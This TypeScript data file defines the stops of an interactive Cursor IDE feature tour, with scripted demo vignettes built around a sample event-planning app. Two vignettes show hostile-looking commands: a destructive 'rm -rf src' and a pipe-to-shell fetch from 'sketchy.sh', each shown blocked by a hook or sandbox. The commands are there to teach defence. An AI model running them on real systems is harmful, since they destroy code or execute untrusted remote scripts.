/**
 * The single-screen tour: every feature is a camera stop INSIDE the mock IDE.
 * Each stop zooms the Prezi camera to a real region of the UI, plays its demo
 * in place (an existing simulation or a scripted vignette rendered into that
 * region), and shows a side-by-side description panel.
 *
 * All content follows one project: Lion Events, an event planning site for
 * Columbia clubs. Stops are ordered as a 4-act storyboard; tracks and the
 * 8-stop crash course are filtered views over the same list.
 */

import type { FeatureId } from './features'

/** Physical areas of the IDE the camera can zoom to (data-region attributes). */
export type RegionId =
  | 'chat'
  | 'input'
  | 'editor'
  | 'code-panel'
  | 'files'
  | 'terminal'
  | 'sidebar'

/** Where a scripted vignette renders inside the IDE. */
export type SlotId = 'terminal' | 'editor-file' | 'chat' | 'files' | 'popover-model' | 'popover-ring'

export type VignetteStep =
  | { kind: 'cmd'; text: string }
  | { kind: 'out'; text: string; tone?: 'ok' | 'err' | 'dim' }
  | { kind: 'user'; text: string }
  | { kind: 'agent'; text: string }
  | { kind: 'tool'; name: string; detail: string; status: 'ok' | 'run' | 'blocked' }
  | { kind: 'file'; name: string }
  | { kind: 'code'; text: string }
  | { kind: 'banner'; text: string; tone: 'ok' | 'err' | 'warn' }

export type VignetteSpec =
  | { type: 'script'; frame: 'terminal' | 'chat' | 'file'; steps: VignetteStep[] }
  | {
      type: 'race'
      task: string
      contenders: { model: string; note: string }[]
      winner: number
    }
  | { type: 'ring'; segments: { label: string; tokens: string; share: number }[] }

/** Presenter tracks: filtered views over the full stop list. */
export type TrackId = 'core' | 'systems' | 'ship'

/** What the guided tour walks: the crash course, one track, or everything. */
export type PathId = 'crash' | 'all' | TrackId

export interface TourStop {
  id: string
  title: string
  /** Systems-metaphor one-liner shown above the title. */
  kicker: string
  headline: string
  points: string[]
  failureMode?: string
  tryIt?: string
  gem?: boolean
  cite: { label: string; url: string }
  /** IDE region the camera zooms to. */
  region: RegionId
  /** Reuse one of the original in-IDE simulations. */
  sim?: FeatureId
  /** Scripted vignette + where in the IDE it renders. */
  slot?: SlotId
  vignette?: VignetteSpec
  /** Tab label when the vignette opens as a file in the editor. */
  fileName?: string
  /** Presenter track this stop belongs to. */
  track: TrackId
  /** Storyboard act (1–4); stops are ordered by act. */
  act: 1 | 2 | 3 | 4
  /** Part of the 8-stop crash course. */
  crash?: boolean
}

export const acts: { n: 1 | 2 | 3 | 4; title: string }[] = [
  { n: 1, title: 'Local loop' },
  { n: 2, title: 'Context & policy' },
  { n: 3, title: 'Parallel & external' },
  { n: 4, title: 'Ship & harden' },
]

export const tracks: { id: TrackId; label: string }[] = [
  { id: 'core', label: 'Core loop' },
  { id: 'systems', label: 'Agent systems' },
  { id: 'ship', label: 'Ship & harden' },
]

export const crashMission = 'Friday club fair in Lerner — ship waitlist before 5pm.'

/** Clone command for the real starter students take home. */
export const starterClone = 'npx degit pookie2006/Cursor-Demo/starter/lion-events lion-events'
export const starterUrl =
  'https://github.com/pookie2006/Cursor-Demo/tree/main/starter/lion-events'

export const stops: TourStop[] = [
  /* ————— Act 1 · Local loop ————— */
  {
    id: 'agent',
    title: 'Agent',
    kicker: 'Instructions + tools + model — one harness',
    headline: 'Describe the outcome; Agent runs the loop in this chat',
    points: [
      'Searches the repo, edits files, runs commands, verifies',
      'Every tool call is visible — watch the reply and diffs land',
      'Checkpoints snapshot each step, independent of git',
    ],
    failureMode: 'Long sessions compact: old turns get summarized away',
    tryIt: 'Build Lion Events for Columbia clubs: event list, NetID/email RSVP, month view of Lerner & Mudd rooms.',
    cite: { label: 'Agent overview', url: 'https://cursor.com/docs/agent/overview' },
    region: 'chat',
    sim: 'agent',
    track: 'core',
    act: 1,
    crash: true,
  },
  {
    id: 'modes',
    title: 'Modes',
    kicker: 'A mode is a tool policy',
    headline: 'Watch the pills cycle: same prompt, four permission sets',
    points: [
      'Ask = read-only · Plan = design before build',
      'Debug = hypothesize → instrument → reproduce → fix',
      'Agent = the full loop · ⇧Tab cycles, ⌘. opens the menu',
    ],
    failureMode: 'Running Agent when you wanted Ask: edits you didn’t ask for',
    tryIt: '⇧Tab → Plan the Mudd 233 capacity cap; don’t build yet',
    cite: { label: 'Plan & Debug modes', url: 'https://cursor.com/docs/agent/modes' },
    region: 'input',
    sim: 'modes',
    track: 'core',
    act: 1,
    crash: true,
  },
  {
    id: 'tab',
    title: 'Tab',
    kicker: 'Predicts the next edit, not the next token',
    headline: 'The gray ghost line is the model following your refactor',
    points: [
      'Multi-line jumps, aware of your recent diffs',
      'Tab accepts · Esc dismisses',
      'Rules don’t apply here; hooks can fire on accepts',
    ],
    tryIt: 'Watch the fetch call type itself in, then get accepted',
    cite: { label: 'Tab', url: 'https://cursor.com/docs/tab' },
    region: 'editor',
    sim: 'tab',
    track: 'core',
    act: 1,
    crash: true,
  },
  {
    id: 'inline-edit',
    title: 'Inline Edit ⌘K',
    kicker: 'Surgical, local, diff-previewed',
    headline: 'Select code, describe the change, it lands in place',
    points: [
      'Best for single-block rewrites; Agent for multi-file work',
      'User Rules don’t apply to ⌘K — keep prompts self-contained',
    ],
    tryIt: 'Validate the Columbia email domain with an inline error',
    cite: { label: 'Inline Edit', url: 'https://cursor.com/docs/inline-edit' },
    region: 'editor',
    sim: 'inline-edit',
    track: 'core',
    act: 1,
    crash: true,
  },
  {
    id: 'diffs',
    title: 'Files Changed',
    kicker: 'Review before you commit',
    headline: 'Every created, edited, or deleted file lands in this card',
    points: [
      'Open a file to inspect the full diff',
      'Keep what works, revert the rest',
    ],
    tryIt: 'Skim the change list after big tasks — catch surprises early',
    cite: { label: 'Reviewing changes', url: 'https://cursor.com/docs/agent/overview' },
    region: 'files',
    sim: 'diffs',
    track: 'core',
    act: 1,
    crash: true,
  },
  {
    id: 'context',
    title: '@ Context',
    kicker: 'Ground the prompt in your project',
    headline: 'Type @ and attach files, folders, git state, or docs',
    points: [
      '@Files, @Folders, @Branch, @Docs, @Browser, @Terminals',
      'When unsure, let Agent search instead of pasting blobs',
      'Works in chat and in inline prompts',
    ],
    tryIt: '@Branch, then ask for a review of the diff',
    cite: { label: 'Prompting & @ mentions', url: 'https://cursor.com/docs/agent/prompting' },
    region: 'input',
    sim: 'context',
    track: 'core',
    act: 1,
  },

  /* ————— Act 2 · Context & policy ————— */
  {
    id: 'context-ring',
    title: 'Context Ring',
    kicker: 'Context is RAM — manage it like memory',
    headline: 'Everything you attach competes for one window',
    points: [
      'The ring shows what rules, skills, and MCP tools cost',
      'History grows every turn; free space shrinks',
      'Compaction silently summarizes old turns when full',
    ],
    failureMode: 'Stuffing the window and wondering why Agent forgot the plan',
    gem: true,
    cite: { label: 'Context management', url: 'https://cursor.com/docs/agent/prompting' },
    region: 'input',
    slot: 'popover-ring',
    vignette: {
      type: 'ring',
      segments: [
        { label: 'Rules', tokens: '1.2k', share: 0.05 },
        { label: 'Skills', tokens: '0.8k', share: 0.03 },
        { label: 'MCP tools', tokens: '2.1k', share: 0.08 },
        { label: '@Files', tokens: '3.4k', share: 0.13 },
        { label: 'History', tokens: '4.5k', share: 0.17 },
        { label: 'Free', tokens: '20k', share: 0.54 },
      ],
    },
    track: 'systems',
    act: 2,
    crash: true,
  },
  {
    id: 'rules',
    title: 'Rules & AGENTS.md',
    kicker: 'Persistent, scoped system guidance',
    headline: 'This .mdc file loads whenever a matching file is touched',
    points: [
      '.cursor/rules/*.mdc: always · glob · intelligent · @manual',
      'Nested AGENTS.md for monorepos; team rules take precedence',
    ],
    failureMode: 'Rules don’t apply to Tab; User Rules skip ⌘K',
    tryIt: '/create-rule — RSVP forms use useRsvp(); campus building codes, not free-text rooms',
    cite: { label: 'Rules', url: 'https://cursor.com/docs/rules' },
    region: 'editor',
    slot: 'editor-file',
    fileName: 'frontend.mdc',
    vignette: {
      type: 'script',
      frame: 'file',
      steps: [
        { kind: 'file', name: '.cursor/rules/frontend.mdc' },
        { kind: 'code', text: '---' },
        { kind: 'code', text: 'globs: src/components/**' },
        { kind: 'code', text: '---' },
        { kind: 'code', text: 'RSVP forms must use useRsvp().' },
        { kind: 'code', text: 'Campus building codes (MUDD, LER) — no free-text rooms.' },
        { kind: 'banner', text: 'Scoped: loads only when src/components/** is touched', tone: 'ok' },
      ],
    },
    track: 'systems',
    act: 2,
  },
  {
    id: 'skills',
    title: 'Skills',
    kicker: 'Procedures loaded on demand',
    headline: 'Only name + description live in context until invoked',
    points: [
      'SKILL.md plus scripts and references per skill',
      'disable-model-invocation → true slash commands',
      '/migrate-to-skills converts always-on rules',
    ],
    failureMode: 'Putting procedures in always-on rules burns your ring',
    tryIt: '/create-skill deploy-preview for lion-events PRs',
    gem: true,
    cite: { label: 'Skills', url: 'https://cursor.com/docs/agent/skills' },
    region: 'editor',
    slot: 'editor-file',
    fileName: 'SKILL.md',
    vignette: {
      type: 'script',
      frame: 'file',
      steps: [
        { kind: 'file', name: '.cursor/skills/deploy-preview/SKILL.md' },
        { kind: 'code', text: 'name: deploy-preview' },
        { kind: 'code', text: 'description: Build & deploy a PR preview of lion-events' },
        { kind: 'banner', text: 'Only these two lines always loaded', tone: 'ok' },
        { kind: 'cmd', text: '/deploy-preview' },
        { kind: 'out', text: 'full body + scripts stream in on demand', tone: 'dim' },
      ],
    },
    track: 'systems',
    act: 2,
    crash: true,
  },
  {
    id: 'hooks',
    title: 'Hooks',
    kicker: 'Intercept the agent loop with policy',
    headline: 'Watch a hook block a destructive command in the terminal',
    points: [
      'beforeShellExecution, afterFileEdit, MCP, subagent, stop',
      'Hooks fire on Tab and workspaceOpen too',
      'Cloud agents read hooks from the repo, not ~/.cursor',
    ],
    failureMode: 'Assuming local hooks.json follows you to cloud runs',
    tryIt: '/create-hook → prettier on afterFileEdit',
    cite: { label: 'Hooks', url: 'https://cursor.com/docs/agent/hooks' },
    region: 'terminal',
    slot: 'terminal',
    vignette: {
      type: 'script',
      frame: 'terminal',
      steps: [
        { kind: 'cmd', text: 'rm -rf node_modules/.cache && rm -rf src' },
        { kind: 'tool', name: 'beforeShellExecution', detail: 'policy: block destructive rm', status: 'blocked' },
        { kind: 'banner', text: 'Blocked by hooks.json', tone: 'err' },
        { kind: 'tool', name: 'afterFileEdit', detail: 'prettier --write RsvpForm.tsx', status: 'ok' },
      ],
    },
    track: 'systems',
    act: 2,
  },
  {
    id: 'models',
    title: 'Models & Auto',
    kicker: 'Pick intelligence, speed, and spend deliberately',
    headline: 'The selector next to Send decides who does the thinking',
    points: [
      'Cursor Models pool vs named frontier models',
      'Auto modes: Cost, Balance, Intelligence',
      'Switch mid-task once exploration is done',
    ],
    failureMode: 'Teaching Max Mode as universal — it’s legacy-plan-specific',
    tryIt: 'Cycle models after the exploration phase of a task',
    cite: { label: 'Models & pricing', url: 'https://cursor.com/docs/models' },
    region: 'input',
    slot: 'popover-model',
    vignette: {
      type: 'script',
      frame: 'chat',
      steps: [
        { kind: 'out', text: 'task: explore the calendar library options', tone: 'dim' },
        { kind: 'tool', name: 'Auto (Balance)', detail: 'fast model, low spend', status: 'ok' },
        { kind: 'out', text: 'task: rewrite RSVP concurrency handling', tone: 'dim' },
        { kind: 'tool', name: 'Auto (Intelligence)', detail: 'thinking model, deep context', status: 'ok' },
        { kind: 'banner', text: 'Max Mode: legacy plans only', tone: 'warn' },
      ],
    },
    track: 'core',
    act: 2,
  },

  /* ————— Act 3 · Parallel & external ————— */
  {
    id: 'subagents',
    title: 'Subagents & Multitask',
    kicker: 'Context isolation is a systems optimization',
    headline: 'Children flood their own windows; this chat stays small',
    points: [
      'Built-ins: Explore, Bash, Browser — plus .cursor/agents',
      '/multitask and Build in Parallel fan work out',
      'Explore can run a different model than the parent',
    ],
    failureMode: 'Serial exploration in the parent fills the expensive window',
    tryIt: '/create-subagent, then /multitask two independent tasks',
    cite: { label: 'Subagents', url: 'https://cursor.com/docs/agent/subagents' },
    region: 'chat',
    slot: 'chat',
    vignette: {
      type: 'script',
      frame: 'chat',
      steps: [
        { kind: 'user', text: 'Map where RSVP state lives, and plan the calendar refactor' },
        { kind: 'tool', name: 'Explore subagent', detail: 'reads 43 files in its own context', status: 'ok' },
        { kind: 'tool', name: 'Bash subagent', detail: 'runs the test suite in parallel', status: 'ok' },
        { kind: 'agent', text: 'Parent context grew by one summary — not 43 files.' },
      ],
    },
    track: 'systems',
    act: 3,
  },
  {
    id: 'worktrees',
    title: 'Worktrees & best-of-n',
    kicker: 'Git worktrees as agent sandboxes',
    headline: 'Three models race on isolated checkouts; keep the winner',
    points: [
      '/worktree · /apply-worktree · /delete-worktree',
      'worktrees.json bootstraps dependencies per checkout',
    ],
    failureMode: 'Two agents editing one checkout — races and clobbered diffs',
    tryIt: '/best-of-n composer,sonnet,gpt on the flaky waitlist test before Friday’s club fair',
    gem: true,
    cite: { label: 'Worktrees', url: 'https://cursor.com/docs/agent/worktrees' },
    region: 'chat',
    slot: 'chat',
    vignette: {
      type: 'race',
      task: '/best-of-n composer,sonnet,gpt — fix flaky waitlist.test.ts before Friday’s club fair',
      contenders: [
        { model: 'composer-2.5', note: '20/20 passes' },
        { model: 'sonnet', note: '18/20 passes' },
        { model: 'gpt', note: '19/20 passes' },
      ],
      winner: 0,
    },
    track: 'systems',
    act: 3,
  },
  {
    id: 'mcp',
    title: 'MCP',
    kicker: 'The external tool ABI for agents',
    headline: 'Agent calls tools beyond the filesystem, with approval',
    points: [
      'stdio · SSE · HTTP transports; project or user mcp.json',
      'Tools, prompts, resources — and MCP Apps with real UI',
      'Enterprise allowlists gate what can be wired up',
    ],
    failureMode: 'Prompt injection via tool results — treat outputs as untrusted',
    tryIt: 'File the Linear bug: “Double-click RSVP on Lion Events DevFest page”',
    cite: { label: 'MCP', url: 'https://cursor.com/docs/mcp' },
    region: 'chat',
    slot: 'chat',
    vignette: {
      type: 'script',
      frame: 'chat',
      steps: [
        { kind: 'user', text: 'File the double-click RSVP bug on the DevFest page in Linear' },
        { kind: 'tool', name: 'linear.create_issue', detail: 'awaiting approval…', status: 'run' },
        { kind: 'banner', text: 'Approval gate — Run Modes decide', tone: 'warn' },
        { kind: 'tool', name: 'linear.create_issue', detail: 'CU-142 “Double-click RSVP on Lion Events DevFest page”', status: 'ok' },
      ],
    },
    track: 'systems',
    act: 3,
  },
  {
    id: 'checkpoints',
    title: 'Checkpoints & Queue',
    kicker: 'Rollback without touching git',
    headline: 'Every agent step is restorable; messages queue while it works',
    points: [
      'Restore to before a bad refactor in one click',
      'Queue follow-ups; ⌘Enter interrupts and jumps the queue',
    ],
    gem: true,
    tryIt: 'Queue two follow-ups during a long Agent run',
    cite: { label: 'Agent overview', url: 'https://cursor.com/docs/agent/overview' },
    region: 'chat',
    slot: 'chat',
    vignette: {
      type: 'script',
      frame: 'chat',
      steps: [
        { kind: 'user', text: 'That refactor broke the calendar — go back' },
        { kind: 'tool', name: 'Checkpoint', detail: 'restored to before the refactor — not a git revert', status: 'ok' },
        { kind: 'out', text: 'Queued: “now try it with date-fns instead”', tone: 'dim' },
        { kind: 'banner', text: '⌘Enter jumps the queue', tone: 'ok' },
      ],
    },
    track: 'core',
    act: 3,
  },

  /* ————— Act 4 · Ship & harden ————— */
  {
    id: 'browser',
    title: 'Browser',
    kicker: 'Closed-loop frontend verification',
    headline: 'Agent opens Lion Events and checks the waitlist itself',
    points: [
      'Navigate, click, type, screenshot, read the console',
      'Fixes get verified, not assumed',
    ],
    tryIt: 'Verify RSVP → waitlist for a full Mudd room',
    cite: { label: 'Browser', url: 'https://cursor.com/docs/agent/browser' },
    region: 'code-panel',
    sim: 'browser',
    track: 'ship',
    act: 4,
  },
  {
    id: 'bugbot',
    title: 'Bugbot & /review',
    kicker: 'Agents in the merge gate',
    headline: 'Automated review runs on these diffs before humans do',
    points: [
      '/review, /review-bugbot, /review-security on local diffs',
      'PR comments with one-click Fix in Cursor',
    ],
    failureMode: 'Treating a green agent review as proof — it’s a filter, not a verdict',
    tryIt: '/review before you push the club-fair changes',
    cite: { label: 'Bugbot', url: 'https://cursor.com/bugbot' },
    region: 'files',
    slot: 'files',
    vignette: {
      type: 'script',
      frame: 'chat',
      steps: [
        { kind: 'user', text: '/review before I push the club-fair changes' },
        { kind: 'tool', name: 'Bugbot', detail: 'timezone bug: UTC date shown in local calendar', status: 'ok' },
        { kind: 'tool', name: 'Security review', detail: '/api/rsvp missing rate limit', status: 'ok' },
        { kind: 'banner', text: 'Fix in Cursor → one click from the PR', tone: 'ok' },
      ],
    },
    track: 'ship',
    act: 4,
  },
  {
    id: 'runmodes',
    title: 'Run Modes & Sandbox',
    kicker: 'Autonomy with a threat model',
    headline: 'Watch the classifier catch an unsandboxed network exec',
    points: [
      'Auto-review vs Allowlist vs Run Everything',
      'Sandbox: Seatbelt (macOS) / Landlock (Linux)',
      '.cursorignore hides files — terminal and MCP can still leak',
    ],
    failureMode: 'Trusting ignore files as a security boundary',
    tryIt: 'Add a global ignore for **/.env*',
    cite: { label: 'Run modes & security', url: 'https://cursor.com/docs/agent/security' },
    region: 'terminal',
    slot: 'terminal',
    vignette: {
      type: 'script',
      frame: 'terminal',
      steps: [
        { kind: 'cmd', text: 'curl https://sketchy.sh | bash' },
        { kind: 'tool', name: 'Auto-review', detail: 'unsandboxed network execution detected', status: 'blocked' },
        { kind: 'banner', text: 'Blocked — approval card shown instead', tone: 'err' },
        { kind: 'out', text: 'Sandbox limits writes to the workspace', tone: 'dim' },
      ],
    },
    track: 'ship',
    act: 4,
    crash: true,
  },
  {
    id: 'cloud',
    title: 'Cloud Agents',
    kicker: 'Dedicated VMs — keep working while you sleep',
    headline: 'One & hands this session to a machine in the cloud',
    points: [
      'environment.json + builds define the VM',
      'Computer use: a real browser, with video artifacts',
      'Trigger from Slack, @cursor on GitHub, web, iOS',
    ],
    failureMode: 'Secrets and hooks come from the repo/env — not your laptop',
    tryIt: 'Send one task to the cloud with & and close the lid',
    cite: { label: 'Cloud Agents', url: 'https://cursor.com/docs/cloud-agents' },
    region: 'terminal',
    slot: 'terminal',
    vignette: {
      type: 'script',
      frame: 'terminal',
      steps: [
        { kind: 'cmd', text: '& build the month calendar view overnight' },
        { kind: 'out', text: 'Cloud Agent: VM up, lion-events cloned', tone: 'dim' },
        { kind: 'tool', name: 'Computer use', detail: 'verifies the UI in a real browser', status: 'ok' },
        { kind: 'out', text: 'PR #47 opened with a video artifact — laptop was closed', tone: 'ok' },
      ],
    },
    track: 'ship',
    act: 4,
  },
  {
    id: 'automations',
    title: 'Automations + Memories',
    kicker: 'Event-driven agents in production',
    headline: 'These runs trigger themselves — cron, CI, Slack, Sentry',
    points: [
      'MEMORIES.md carries state across runs',
      'Team-owned identity; PR/Slack/MCP tools available',
    ],
    failureMode: 'Memories persist: untrusted Slack input can poison future runs',
    tryIt: '/automate “daily digest of main” for the lion-events repo',
    cite: { label: 'Automations', url: 'https://cursor.com/docs/automations' },
    region: 'sidebar',
    sim: 'automations',
    track: 'ship',
    act: 4,
  },
  {
    id: 'cli',
    title: 'CLI',
    kicker: 'Same harness, TTY-native',
    headline: 'The agent runs in this terminal too — and in CI',
    points: [
      'agent -p for scripts and pipelines',
      '& hands the session to a Cloud Agent',
      'Sessions resume; the sandbox applies here too',
    ],
    tryIt: 'curl https://cursor.com/install | bash, then agent',
    cite: { label: 'CLI', url: 'https://cursor.com/docs/cli' },
    region: 'terminal',
    slot: 'terminal',
    vignette: {
      type: 'script',
      frame: 'terminal',
      steps: [
        { kind: 'cmd', text: "agent -p 'add ICS export to event pages'" },
        { kind: 'out', text: '▸ editing src/lib/ics.ts …', tone: 'dim' },
        { kind: 'out', text: '✓ 3 files changed, tests pass', tone: 'ok' },
        { kind: 'cmd', text: "agent 'polish calendar styles' &" },
        { kind: 'out', text: '→ continues on a Cloud Agent', tone: 'dim' },
      ],
    },
    track: 'ship',
    act: 4,
  },
  {
    id: 'sdk',
    title: 'SDK',
    kicker: 'Embed the harness in your own software',
    headline: 'Fifteen lines of TypeScript and agents become infrastructure',
    points: [
      '@cursor/sdk: local or cloud runtime',
      'Skills, hooks, MCP, subagents carry over',
      'CI bots, kanban workers, product embeds',
    ],
    tryIt: 'npm install @cursor/sdk — a PR per club request',
    cite: { label: 'SDK', url: 'https://cursor.com/docs/sdk' },
    region: 'editor',
    slot: 'editor-file',
    fileName: 'club-requests.ts',
    vignette: {
      type: 'script',
      frame: 'file',
      steps: [
        { kind: 'file', name: 'scripts/club-requests.ts' },
        { kind: 'code', text: "import { Agent } from '@cursor/sdk'" },
        { kind: 'code', text: "const agent = await Agent.create({ runtime: 'cloud' })" },
        { kind: 'code', text: "await agent.prompt(`Build a page for ${request.title}`)" },
        { kind: 'out', text: '→ a PR per club request — agents as infrastructure', tone: 'ok' },
      ],
    },
    track: 'ship',
    act: 4,
  },
]

export const stopById = new Map(stops.map((stop) => [stop.id, stop]))

export function isStopId(value: string): boolean {
  return stopById.has(value)
}

/** The ordered stop list a given path walks. */
export function pathStops(path: PathId): TourStop[] {
  if (path === 'all') return stops
  if (path === 'crash') return stops.filter((stop) => stop.crash)
  return stops.filter((stop) => stop.track === path)
}

export function isPathId(value: string): value is PathId {
  return value === 'crash' || value === 'all' || tracks.some((track) => track.id === value)
}

export function actTitle(act: 1 | 2 | 3 | 4): string {
  return acts.find((entry) => entry.n === act)?.title ?? ''
}

/**
 * Jump keys, in path order: digits 1–9, then 0 for stop 10, then letters for
 * the rest (g is reserved for the tour toggle).
 */
export const JUMP_KEYS = '1234567890abcdefhijklm'

/** Stretch challenges shown on the completion card. */
export const challenges = [
  'Design a context budget: rules vs skills vs MCP',
  'Write a hook that blocks network shell unless allowlisted',
  'Custom subagent + skill — justify when to use each',
  '/best-of-n on a hard bug, with a winner rubric',
  'An Automation with Memories that is injection-safe',
  '20-line SDK script that opens a PR on a cloud run',
]
